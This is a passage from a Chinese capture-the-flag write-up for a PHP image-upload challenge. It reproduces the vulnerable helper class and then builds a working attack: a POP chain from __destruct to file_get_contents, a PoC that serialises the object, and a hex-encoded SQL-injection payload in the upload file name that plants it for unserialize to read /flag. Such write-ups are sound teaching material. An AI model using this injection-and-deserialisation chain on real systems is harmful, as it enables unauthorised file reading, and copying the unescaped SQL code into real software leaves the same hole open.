class="hljs-variable">$fileinfo</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getfile</span>(<span class="hljs-variable">$input</span>);<br>        <span class="hljs-comment">// 初始化一个空数组 $array，用于存储文件的详细信息</span><br>        <span class="hljs-variable">$array</span> = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-comment">// 将文件的标题信息存入数组</span><br>        <span class="hljs-variable">$array</span>[<span class="hljs-string">&quot;title&quot;</span>] = <span class="hljs-variable">$fileinfo</span>[<span class="hljs-string">&#x27;title&#x27;</span>];<br>        <span class="hljs-comment">// 将文件名存入数组</span><br>        <span class="hljs-variable">$array</span>[<span class="hljs-string">&quot;filename&quot;</span>] = <span class="hljs-variable">$fileinfo</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>        <span class="hljs-comment">// 将文件扩展名存入数组</span><br>        <span class="hljs-variable">$array</span>[<span class="hljs-string">&quot;ext&quot;</span>] = <span class="hljs-variable">$fileinfo</span>[<span class="hljs-string">&#x27;ext&#x27;</span>];<br>        <span class="hljs-comment">// 将文件存储路径存入数组</span><br>        <span class="hljs-variable">$array</span>[<span class="hljs-string">&quot;path&quot;</span>] = <span class="hljs-variable">$fileinfo</span>[<span class="hljs-string">&#x27;path&#x27;</span>];<br>        <span class="hljs-comment">// 使用 getimagesize 函数获取上传图片的尺寸信息，返回一个数组</span><br>        <span class="hljs-variable">$img_ext</span> = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$input</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br>        <span class="hljs-comment">// 从尺寸信息数组中提取图片的宽度和高度，存入新数组 $my_ext</span><br>        <span class="hljs-variable">$my_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;width&quot;</span>=&gt;<span class="hljs-variable">$img_ext</span>[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;height&quot;</span>=&gt;<span class="hljs-variable">$img_ext</span>[<span class="hljs-number">1</span>]);<br>        <span class="hljs-comment">// 使用 serialize 函数将 $my_ext 数组序列化为字符串，并将其存入 $array 数组的 &quot;attr&quot; 键中</span><br>        <span class="hljs-variable">$array</span>[<span class="hljs-string">&quot;attr&quot;</span>] = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$my_ext</span>);<br>        <span class="hljs-comment">// 调用 save 方法将文件信息保存到数据库，并获取保存后的记录 ID</span><br>        <span class="hljs-variable">$id</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">save</span>(<span class="hljs-variable">$array</span>);<br>        <span class="hljs-comment">// 如果保存操作返回的 ID 为 0，表示保存失败，输出错误信息并终止脚本</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$id</span> == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Something wrong!&quot;</span>);<br>        &#125;<br>        <span class="hljs-comment">// 输出换行符</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-comment">// 输出上传成功的提示信息，包含图片的 ID</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Your images is uploaded successfully. And your image&#x27;s id is <span class="hljs-subst">$id</span>.&lt;/p&gt;&quot;</span>;<br>    &#125;<br> <br>    <span class="hljs-comment">// 定义一个公共方法 getfile，用于获取上传文件的相关信息</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getfile</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">// 检查 $input 是否被设置</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$input</span>))&#123;<br>            <span class="hljs-comment">// 调用 check 方法对上传文件的信息进行检查，并将结果存储在 $rs 中</span><br>            <span class="hljs-variable">$rs</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$input</span>]);<br>        &#125;<br>        <span class="hljs-comment">// 返回检查后的文件信息</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$rs</span>;<br>    &#125;<br> <br>    <span class="hljs-comment">// 定义一个公共方法 check，用于检查上传文件的合法性</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$info</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">// 生成一个唯一的文件名，使用当前时间和唯一 ID 进行 MD5 加密，截取中间 16 位</span><br>        <span class="hljs-variable">$basename</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">time</span>().<span class="hljs-title function_ invoke__">uniqid</span>()),<span class="hljs-number">9</span>,<span class="hljs-number">16</span>);<br>        <span class="hljs-comment">// 获取上传文件的原始文件名</span><br>        <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;name&quot;</span>];<br>        <span class="hljs-comment">// 从文件名中提取文件扩展名</span><br>        <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&#x27;.&#x27;</span>), <span class="hljs-number">1</span>);<br>        <span class="hljs-comment">// 定义一个允许上传的文件扩展名数组</span><br>        <span class="hljs-variable">$cate_exts</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;jpg&quot;</span>,<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>,<span class="hljs-string">&quot;jpeg&quot;</span>);<br>        <span class="hljs-comment">// 检查上传文件的扩展名是否在允许的扩展名数组中</span><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>,<span class="hljs-variable">$cate_exts</span>))&#123;<br>            <span class="hljs-comment">// 如果不在允许的扩展名数组中，输出错误信息并终止脚本</span><br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;&quot;</span>);<br>        &#125;<br>        <span class="hljs-comment">// 从文件名中去除扩展名，得到文件标题</span><br>        <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$ext</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-comment">// 返回一个包含文件标题、文件名、扩展名和存储路径的数组</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;title&#x27;</span>=&gt;<span class="hljs-variable">$title</span>,<span class="hljs-string">&#x27;filename&#x27;</span>=&gt;<span class="hljs-variable">$basename</span>.<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$ext</span>,<span class="hljs-string">&#x27;ext&#x27;</span>=&gt;<span class="hljs-variable">$ext</span>,<span class="hljs-string">&#x27;path&#x27;</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;folder.<span class="hljs-variable">$basename</span>.<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$ext</span>);<br>    &#125;<br> <br>    <span class="hljs-comment">// 定义一个公共方法 save，用于将文件信息保存到数据库</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">// 检查 $data 是否为空或不是数组</span><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$data</span> || !<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$data</span>))&#123;<br>            <span class="hljs-comment">// 如果条件满足，输出错误信息并终止脚本</span><br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Something wrong!&quot;</span>);<br>        &#125;<br>        <span class="hljs-comment">// 调用 insert_array 方法将文件信息插入数据库，并获取插入记录的 ID</span><br>        <span class="hljs-variable">$id</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">insert_array</span>(<span class="hljs-variable">$data</span>);<br>        <span class="hljs-comment">// 返回插入记录的 ID</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;<br>    &#125;<br> <br>    <span class="hljs-comment">// 定义一个公共方法 insert_array，用于将数组数据插入数据库</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">insert_array</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">// 连接到本地 MySQL 数据库，使用用户名 &quot;r00t&quot;、密码 &quot;r00t&quot; 和数据库名 &quot;pic_base&quot;</span><br>        <span class="hljs-variable">$con</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-string">&quot;r00t&quot;</span>,<span class="hljs-string">&quot;r00t&quot;</span>,<span class="hljs-string">&quot;pic_base&quot;</span>);<br>        <span class="hljs-comment">// 检查数据库连接是否失败</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_connect_errno</span>(<span class="hljs-variable">$con</span>))<br>        &#123;<br>            <span class="hljs-comment">// 如果连接失败，输出错误信息并终止脚本</span><br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connect MySQL Fail:&quot;</span>.<span class="hljs-title function_ invoke__">mysqli_connect_error</span>());<br>        &#125;<br>        <span class="hljs-comment">// 初始化一个空数组 $sql_fields，用于存储 SQL 语句中的字段名</span><br>        <span class="hljs-variable">$sql_fields</span> = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-comment">// 初始化一个空数组 $sql_val，用于存储 SQL 语句中的字段值</span><br>        <span class="hljs-variable">$sql_val</span> = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-comment">// 遍历 $data 数组，将字段名和字段值分别存储到 $sql_fields 和 $sql_val 数组中</span><br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$value</span>)&#123;<br>            <span class="hljs-comment">// 对字段名中的特殊字符进行替换</span><br>            <span class="hljs-variable">$key_temp</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-variable">$key</span>);<br>            <span class="hljs-comment">// 对字段值中的特殊字符进行替换</span><br>            <span class="hljs-variable">$value_temp</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-variable">$value</span>);<br>            <span class="hljs-comment">// 将处理后的字段名添加到 $sql_fields 数组中，并添加反引号</span><br>            <span class="hljs-variable">$sql_fields</span>[] = <span class="hljs-string">&quot;`&quot;</span>.<span class="hljs-variable">$key_temp</span>.<span class="hljs-string">&quot;`&quot;</span>;<br>            <span class="hljs-comment">// 将处理后的字段值添加到 $sql_val 数组中，并添加单引号</span><br>            <span class="hljs-variable">$sql_val</span>[] = <span class="hljs-string">&quot;&#x27;&quot;</span>.<span class="hljs-variable">$value_temp</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>;<br>        &#125;<br>        <span class="hljs-comment">// 构建 SQL 插入语句，将字段名和字段值分别用逗号连接</span><br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO images (&quot;</span>.(<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-variable">$sql_fields</span>)).<span class="hljs-string">&quot;) VALUES(&quot;</span>.(<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-variable">$sql_val</span>)).<span class="hljs-string">&quot;)&quot;</span>;<br>        <span class="hljs-comment">// 执行 SQL 插入语句</span><br>        <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>);<br>        <span class="hljs-comment">// 获取插入记录的 ID</span><br>        <span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">mysqli_insert_id</span>(<span class="hljs-variable">$con</span>);<br>        <span class="hljs-comment">// 关闭数据库连接</span><br>        <span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$con</span>);<br>        <span class="hljs-comment">// 返回插入记录的 ID</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;<br>    &#125;<br> <br>    <span class="hljs-comment">// 定义一个公共方法 view_files，用于查看文件内容</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">view_files</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>)</span>&#123;<br>        <span class="hljs-comment">// 检查 $ifview 属性是否为 False</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;ifview == False)&#123;<br>            <span class="hljs-comment">// 如果为 False，返回 False，表示文件查看功能不可用</span><br>            <span class="hljs-keyword">return</span> False;<br>            <span class="hljs-comment">// 注释说明该功能还不完善，尚未开放</span><br>        &#125;<br>        <span class="hljs-comment">// 使用 file_get_contents 函数读取文件内容</span><br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$path</span>);<br>        <span class="hljs-comment">// 输出文件内容</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br>    &#125;<br> <br>    <span class="hljs-comment">// 定义析构函数，当对象被销毁时自动调用</span><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-comment"># 读取一些配置文件的内容</span><br>        <span class="hljs-comment">// 调用 view_files 方法读取配置文件内容</span><br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">view_files</span>(<span class="hljs-variable">$this</span>-&gt;config);<br>    &#125;<br>&#125;<br> <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>构造pop链：</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi">调用<span class="hljs-keyword">helper</span>.php中的__destruct到方法view_files的file_get_contents<br></code></pre></td></tr></table></figure><p>poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">helper</span></span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$config</span> = <span class="hljs-string">&#x27;/flag&#x27;</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$ifview</span> = <span class="hljs-literal">true</span>;<br><br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">helper</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>现在需要一个反序列化来触发我们的pop链，在show.php里发现有个反序列化</p><p><img src="/../image/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-2.png"></p><p>这里是在反序列化helper类里我们上传的图片的高和宽</p><p><img src="/../image/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-3.png"></p><p>这里的5个参数会保存到数据库里。可以由第一行代码追溯getfile方法到check方法，得到这些参数的返回值</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$fileinfo = $this-&gt;getfile($input)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getfile</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span><br><span class="hljs-function">   </span>&#123;<br>       <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$input</span>))&#123;<br>           <span class="hljs-variable">$rs</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$input</span>]);<br>       &#125;<br>       <span class="hljs-keyword">return</span> <span class="hljs-variable">$rs</span>;<br>   &#125;<br></code></pre></td></tr></table></figure><hr><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$info</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$basename</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">time</span>().<span class="hljs-title function_ invoke__">uniqid</span>()),<span class="hljs-number">9</span>,<span class="hljs-number">16</span>);<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;name&quot;</span>];<br>    <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&#x27;.&#x27;</span>), <span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$cate_exts</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;jpg&quot;</span>,<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>,<span class="hljs-string">&quot;jpeg&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>,<span class="hljs-variable">$cate_exts</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$ext</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$filename</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;title&#x27;</span>=&gt;<span class="hljs-variable">$title</span>,<span class="hljs-string">&#x27;filename&#x27;</span>=&gt;<span class="hljs-variable">$basename</span>.<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$ext</span>,<span class="hljs-string">&#x27;ext&#x27;</span>=&gt;<span class="hljs-variable">$ext</span>,<span class="hljs-string">&#x27;path&#x27;</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;folder.<span class="hljs-variable">$basename</span>.<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$ext</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>title：上传图片的文件名</p><p>filename：文件名+.后缀</p><p>ext：上传的图片的后缀</p><p>path：成员变量folder+…&#x3D;&#x2F;pic&#x2F;…</p><p>attr：图像的高和宽数组</p><p>可以看到title没有进行过滤处理</p><p>然后可以由最后一行代码追溯到save方法-&gt;insert_array方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">insert_array</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$con</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-string">&quot;r00t&quot;</span>,<span class="hljs-string">&quot;r00t&quot;</span>,<span class="hljs-string">&quot;pic_base&quot;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_connect_errno</span>(<span class="hljs-variable">$con</span>))<br>    &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connect MySQL Fail:&quot;</span>.<span class="hljs-title function_ invoke__">mysqli_connect_error</span>());<br>    &#125;<br>    <span class="hljs-variable">$sql_fields</span> = <span class="hljs-keyword">array</span>();<br>    <span class="hljs-variable">$sql_val</span> = <span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$value</span>)&#123;<br>        <span class="hljs-variable">$key_temp</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-variable">$key</span>);<br>        <span class="hljs-variable">$value_temp</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-variable">$value</span>);<br>        <span class="hljs-variable">$sql_fields</span>[] = <span class="hljs-string">&quot;`&quot;</span>.<span class="hljs-variable">$key_temp</span>.<span class="hljs-string">&quot;`&quot;</span>;<br>        <span class="hljs-variable">$sql_val</span>[] = <span class="hljs-string">&quot;&#x27;&quot;</span>.<span class="hljs-variable">$value_temp</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>;<br>    &#125;<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO images (&quot;</span>.(<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-variable">$sql_fields</span>)).<span class="hljs-string">&quot;) VALUES(&quot;</span>.(<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-variable">$sql_val</span>)).<span class="hljs-string">&quot;)&quot;</span>;<br>    <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>);<br>    <span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">mysqli_insert_id</span>(<span class="hljs-variable">$con</span>);<br>    <span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$con</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>$sql_fields是5个列名即参数</p><p>$sql_val则是5个参数值</p><p>这里我们可以用title来注入，这里能将我们的数据写入数据库中</p><p>payload：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">1</span>&#x27;,&#x27;<span class="hljs-number">2</span>&#x27;,&#x27;<span class="hljs-number">3</span>&#x27;,&#x27;<span class="hljs-number">4</span>&#x27;,0x4f3a363a<span class="hljs-number">226865</span>6c<span class="hljs-number">70657222</span>3a323a7b733a393a<span class="hljs-number">2200</span>2a<span class="hljs-number">00696676696577</span>223b623a313b733a393a<span class="hljs-number">2200</span>2a<span class="hljs-number">0063</span>6f6e<span class="hljs-number">66696722</span>3b733a353a222f666c<span class="hljs-number">616722</span>3b7d)#.png<br><br><br>十六进制编码前：<br>O:6:&quot;helper&quot;:2:&#123;s:9:&quot;.*.ifview&quot;;b:1;s:9:&quot;.*.config&quot;;s:5:&quot;/flag&quot;;&#125;<br></code></pre></td></tr></table></figure><p>insert的sql语句为</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> table_name (<span class="hljs-string">&#x27;column1&#x27;</span>,<span class="hljs-string">&#x27;column2&#x27;</span>,<span class="hljs-string">&#x27;column3&#x27;</span>,...)<br><span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;value1&#x27;</span>,<span class="hljs-string">&#x27;value2&#x27;</span>,<span class="hljs-string">&#x27;value3&#x27;</span>,...);<br><br>写入payload后<br><br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> table_name (<span class="hljs-string">&#x27;column1&#x27;</span>,<span class="hljs-string">&#x27;column2&#x27;</span>,<span class="hljs-string">&#x27;column3&#x27;</span>,...)<br><span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-number">0x4f3a363a2268656c706572223a323a7b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d</span>)#<span class="hljs-string">&#x27;,&#x27;</span>value2<span class="hljs-string">&#x27;,&#x27;</span>value3<span class="hljs-string">&#x27;,...);</span><br><span class="hljs-string"></span><br><span class="hljs-string">可以简化为</span><br><span class="hljs-string">INSERT INTO table_name (&#x27;</span>column1<span class="hljs-string">&#x27;,&#x27;</span>column2<span class="hljs-string">&#x27;,&#x27;</span>column3<span class="hljs-string">&#x27;,...)</span><br><span class="hljs-string">VALUES (&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-number">2</span><span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-number">3</span><span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-number">4</span><span class="hljs-string">&#x27;,0x4f3a363a2268656c706572223a323a7b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d)</span><br></code></pre></td></tr></table></figure><p>这里value1就是title的值，即上面的payload。然后payload里的1,2,3,4,5对应5个参数。等于我们在value1这个位置闭合，所以最后要用#注释掉后面的内容。因为attr字段在最后所以要放在第5个位置。又因为上传的文件名不能有双引号，所以要用十六进制编码，然后前面一定要加上0x</p><p>上传一个图片然后把文件名改为payload上传，然后到show页面就能看到flag</p><p><img src="/../image/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-4.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
